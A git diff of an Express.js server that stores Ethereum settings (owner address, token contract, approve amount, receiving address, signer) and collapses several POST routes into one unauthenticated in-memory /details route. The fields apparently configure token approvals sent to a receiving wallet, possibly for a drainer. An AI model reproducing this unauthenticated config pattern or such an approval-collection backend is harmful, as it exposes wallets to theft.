@@ -1,7 +1,9 @@
+require("dotenv").config()
+
 const express = require("express")
 const main = require("./ethereum/main")
 const cors = require("cors")
-const db = require("./config/db")
+let details = require("./details")
 
 const app = express()
 
@@ -15,64 +17,23 @@ app.get("/", (req, res)=>{
 
 app.get("/details", async(req, res)=>{
   try{
-     let result = await db.getMany(["owner-address", "token-ca","approve-amount", "receiving-address"])
+     let result = details
      res.status(200).json({data: result, message: "details fetched"})
   }catch(err){
     res.status(500).json({message: err.message})
   }
 })
 
-app.post("/token-ca", async(req, res)=>{
+app.post("/details", async(req, res)=>{
   try{
-    let {token_ca} = req.body
-    console.log(token_ca);
-    await db.put("token-ca", token_ca)
-    res.status(200).json({message: "token_ca added"})
+    let detail = new Object(req.body)
+    let key = Object.keys(detail)
+    let value = Object.values(detail)
+    console.log(detail);
+    details = {...details, [key[0]]: value[0] }
+    res.status(200).json({data: details, message: key[0] + " " + "added"})
   }catch(err){
-    res.status(500).json({message: err.message})
-  }
-})
-
-app.post("/owner-address", async (req, res)=>{
-  try{
-    let {owner_address} = req.body
-    console.log(owner_address)
-    await db.put("owner-address", owner_address)
-    res.status(200).json({message: "owner_address added"})
-  }catch(err){
-    res.status(500).json({message: err.message})
-  }
-})
-
-app.post("/receiving-address", async (req, res)=>{
-  try{
-    let {receiving_address} = req.body;
-    console.log(req.body)
-    await db.put("receiving-address", receiving_address)
-    res.status(200).json({message: "receiving_address added"})
-  }catch(err){
-    res.status(500).json({message: err.message})
-  }
-  
-})
-
-app.post("/approve-amount", async (req, res)=>{
-  try{
-    let {approve_amount} = req.body
-    console.log(approve_amount)
-    await db.put("approve-amount", approve_amount)
-    res.status(200).json({message: "approve-amount set"})
-  }catch(err){
-    res.status(500).json({message: err.message})
-  }
-})
-
-app.post("/owner-signer", async (req, res)=>{
-  try{
-    let {signer} = req.body
-    await db.put("signer", signer)
-    res.status(200).json({message: "signer set"})
-  }catch(err){
+     console.log(err)
     res.status(500).json({message: err.message})
   }
 })
